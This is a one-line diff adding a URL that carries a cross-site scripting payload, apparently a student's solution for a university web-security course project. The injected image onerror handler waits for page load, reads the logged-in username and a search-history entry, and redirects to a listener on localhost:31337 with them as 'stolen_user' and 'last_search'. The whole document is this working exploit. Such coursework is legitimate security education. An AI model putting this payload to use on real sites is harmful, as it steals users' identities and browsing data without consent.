@@ -1,0 +1,1 @@
+https://project2.ecen4133.org/search?xssdefense=1&q=<img src=0 onerror= "window.addEventListener('load', function () {username = document.getElementById('logged-in-user').innerText;temp = document.getElementsByClassName('history-item list-group-item')[1].innerText;window.location.href = 'http://localhost:31337/?stolen_user='.concat(username, '%26last_search=', temp);});">
